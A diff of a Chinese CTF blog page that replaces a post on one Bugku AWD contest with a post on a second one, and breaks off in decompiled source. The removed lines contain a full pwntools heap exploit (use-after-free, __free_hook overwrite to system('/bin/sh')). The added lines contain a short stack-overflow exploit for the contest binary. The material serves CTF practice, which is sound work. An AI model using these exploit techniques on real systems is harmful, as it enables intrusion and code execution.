@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Bugku CTF-AWD，21人混战，作者爆0">
-<title>AWD水友赛</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Bugku CTF-AWD，21人混战，作者爆还是0">
+<title>第二次AWD水友赛</title>
 
-<link rel='canonical' href='https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/'>
+<link rel='canonical' href='https://expl0rer.top/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/'>
 
-<link rel="stylesheet" href="/scss/style.min.84f4364fa3a5758ecded3430d054d555b355a8e9efd1baf1e03c18d73802579f.css"><meta property='og:title' content="AWD水友赛">
-<meta property='og:description' content="Bugku CTF-AWD，21人混战，作者爆0">
-<meta property='og:url' content='https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/'>
+<link rel="stylesheet" href="/scss/style.min.84f4364fa3a5758ecded3430d054d555b355a8e9efd1baf1e03c18d73802579f.css"><meta property='og:title' content="第二次AWD水友赛">
+<meta property='og:description' content="Bugku CTF-AWD，21人混战，作者爆还是0">
+<meta property='og:url' content='https://expl0rer.top/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/'>
 <meta property='og:site_name' content='Expl0rer.Ct'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-02T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-03T18:12:18&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd.png' />
-<meta name="twitter:title" content="AWD水友赛">
-<meta name="twitter:description" content="Bugku CTF-AWD，21人混战，作者爆0"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-04T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-08T16:19:55&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd2.png' />
+<meta name="twitter:title" content="第二次AWD水友赛">
+<meta name="twitter:description" content="Bugku CTF-AWD，21人混战，作者爆还是0"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://expl0rer.top/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd2.png' />
     <link rel="shortcut icon" href="/favicon.ico" />
 <div class="loading">
      
@@ -715,28 +715,8 @@ unicode: "ece7"
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#exploit思路">Exploit思路</a></li>
-    <li><a href="#不足之处">不足之处</a></li>
-    <li><a href="#总结">总结</a>
-      <ol>
-        <li><a href="#攻击端任务打穿对手拿-flag-得分">攻击端任务：“打穿对手，拿 flag 得分”</a>
-          <ol>
-            <li><a href="#1-漏洞挖掘快速定位可利用漏洞">1. 漏洞挖掘：快速定位可利用漏洞</a></li>
-            <li><a href="#2-exp-编写高效生成攻击脚本">2. EXP 编写：高效生成攻击脚本</a></li>
-            <li><a href="#3-漏洞利用获取-shell-与-flag">3. 漏洞利用：获取 Shell 与 flag</a></li>
-            <li><a href="#4-对抗性优化应对对手防御">4. 对抗性优化：应对对手防御</a></li>
-          </ol>
-        </li>
-        <li><a href="#防御端任务修复漏洞守住己方服务器">防御端任务：“修复漏洞，守住己方服务器”</a>
-          <ol>
-            <li><a href="#1-漏洞修复针对性修补漏洞点">1. 漏洞修复：针对性修补漏洞点</a></li>
-            <li><a href="#2-程序重编译与部署">2. 程序重编译与部署</a></li>
-            <li><a href="#3-日志监控与攻击溯源">3. 日志监控与攻击溯源</a></li>
-          </ol>
-        </li>
-        <li><a href="#关键能力要求">关键能力要求</a></li>
-      </ol>
-    </li>
+    <li><a href="#exploit">Exploit</a></li>
+    <li><a href="#exploit的思路">exploit的思路</a></li>
   </ol>
 </nav>
         </div>
@@ -751,13 +731,13 @@ unicode: "ece7"
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
-                <img src="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd_hu_c2f29b530837eeab.png"
-                        srcset="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd_hu_c2f29b530837eeab.png 800w, /p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd_hu_d5a89883d0b64abb.png 1600w"
+            <a href="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
+                <img src="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd2_hu_203aebaf21c47fef.png"
+                        srcset="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd2_hu_203aebaf21c47fef.png 800w, /p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd2_hu_cf761f11a90e3e01.png 1600w"
                         width="800" 
-                        height="476" 
+                        height="460" 
                         loading="lazy"
-                        alt="Featured image of post AWD水友赛" />
+                        alt="Featured image of post 第二次AWD水友赛" />
                 
             </a>
         </div>
@@ -784,12 +764,12 @@ unicode: "ece7"
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">AWD水友赛</a>
+            <a href="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">第二次AWD水友赛</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            Bugku CTF-AWD，21人混战，作者爆0
+            Bugku CTF-AWD，21人混战，作者爆还是0
         </h3>
         
     </div>
@@ -810,7 +790,7 @@ unicode: "ece7"
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-10-02</time>
+                <time class="article-time--published">2025-10-04</time>
             </div>
         
 
@@ -826,23 +806,88 @@ unicode: "ece7"
     <section class="article-content">
     
     
-    <p>前言：激战时间是2025年10月2日13：10——17：00</p>
-<h2 id="exploit思路">Exploit思路
-</h2><p>AI分析&hellip;绷不住：</p>
-<p><img src="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/3.png"
-	width="1186"
-	height="233"
-	srcset="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/3_hu_4d4605e834adbb91.png 480w, /p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/3_hu_bdfea1c0a1d24f9.png 1024w"
+    <p>前言：激战时间是2025年10月4日15：00——16：30</p>
+<p><img src="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/3.png"
+	width="1848"
+	height="919"
+	srcset="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/3_hu_fa9689a2836a841f.png 480w, /p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/3_hu_8c79d5bae27be729.png 1024w"
 	loading="lazy"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="509"
-		data-flex-basis="1221px"
+		data-flex-grow="201"
+		data-flex-basis="482px"
 	
 ></p>
-<p>自己本地复现去吧。</p>
+<h2 id="exploit">Exploit
+</h2><p>自己本地复现去吧。真是绝望啊，还以为是泄露canary值去绕过检查，结果别人就这样去溢出的。</p>
 <p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = remote...</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">v5</span> <span class="o">=</span> <span class="mh">0x1337BEEF</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">v5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Enter a string: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="exploit的思路">exploit的思路
+</h2><p>牢，学了点新东西，别叫贴近实际。</p>
+<p>附件： <a class="link" href="pwn.7z" >pwn.7z</a></p>
+<p>GNU C 库（glibc）的动态链接库文件查询：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">strings ./pwn <span class="p">|</span> grep -i <span class="s2">&#34;glibc\|libc&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/1.png"
+	width="1075"
+	height="516"
+	srcset="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/1_hu_5004e2011ade0f2.png 480w, /p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/1_hu_6a9e3701604f146f.png 1024w"
+	loading="lazy"
+	
+		alt="Libc.so.6"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="208"
+		data-flex-basis="500px"
+	
+></p>
+<p>checksec：</p>
+<p><img src="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/2.png"
+	width="790"
+	height="203"
+	srcset="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/2_hu_e5f234fc283b44ce.png 480w, /p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/2_hu_2bcc0987c7a9f058.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="389"
+		data-flex-basis="933px"
+	
+></p>
+<p>32位程序，保护全开，不用说肯定是堆利用了&hellip;。</p>
+<p>PWN程序部分源码：</p>
+<p>main函数：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -869,234 +914,110 @@ unicode: "ece7"
 </span><span class="lnt">22
 </span><span class="lnt">23
 </span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 环境配置</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 命令发送函数：发送指定命令编号</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">c</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 捕获马匹函数：指定索引和颜色（0=bay,1=chestnut,2=gray）</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">catch</span><span class="p">(</span><span class="n">idx</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">color</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl">    <span class="n">colors</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;bay&#34;</span><span class="p">,</span> <span class="s2">&#34;chestnut&#34;</span><span class="p">,</span> <span class="s2">&#34;gray&#34;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="n">colors</span><span class="p">[</span><span class="n">color</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 命名马匹函数：指定索引和名称（支持字节流）</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">naming</span><span class="p">(</span><span class="n">idx</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 展示马匹函数：指定索引，触发信息输出</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 马匹跳舞函数：指定索引，触发函数指针调用</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dance</span><span class="p">(</span><span class="n">idx</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 释放马匹函数：指定索引，释放堆内存</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">release</span><span class="p">(</span><span class="n">idx</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 1. 泄露 PIE 基址：通过 show(-7) 读取非法索引内存</span>
-</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="o">-</span><span class="mi">7</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">piebase</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x4008</span>
-</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;piebase: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">piebase</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 2. 创建 6 个马匹堆块（索引 0-2、5-7）</span>
-</span></span><span class="line"><span class="cl"><span class="n">catch</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">catch</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">catch</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">catch</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">catch</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">catch</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 3. 泄露堆基址：释放索引 0、1，通过 show(1) 读取残留堆地址</span>
-</span></span><span class="line"><span class="cl"><span class="n">release</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">release</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x260</span>
-</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;heap: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 4. 篡改堆块指针：通过 naming(1) 覆盖为 PIE 内数据地址，泄露 libc 基址</span>
-</span></span><span class="line"><span class="cl"><span class="n">naming</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">piebase</span> <span class="o">+</span> <span class="mh">0x4020</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">catch</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">catch</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">libcbase</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3ec760</span>
-</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libcbase: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libcbase</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 5. 劫持 __free_hook：通过 UAF 漏洞篡改指针，写入 system 地址</span>
-</span></span><span class="line"><span class="cl"><span class="n">release</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">release</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">naming</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span>
-</span></span><span class="line"><span class="cl"><span class="n">catch</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">catch</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">naming</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 6. 触发 system(&#34;/bin/sh&#34;)：命名索引 7 为 /bin/sh，释放时执行</span>
-</span></span><span class="line"><span class="cl"><span class="n">naming</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">release</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 交互获取 shell</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-30h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+20h] [ebp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+24h] [ebp-Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="o">*</span><span class="n">p_argc</span><span class="p">;</span> <span class="c1">// [esp+28h] [ebp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">p_argc</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">argc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
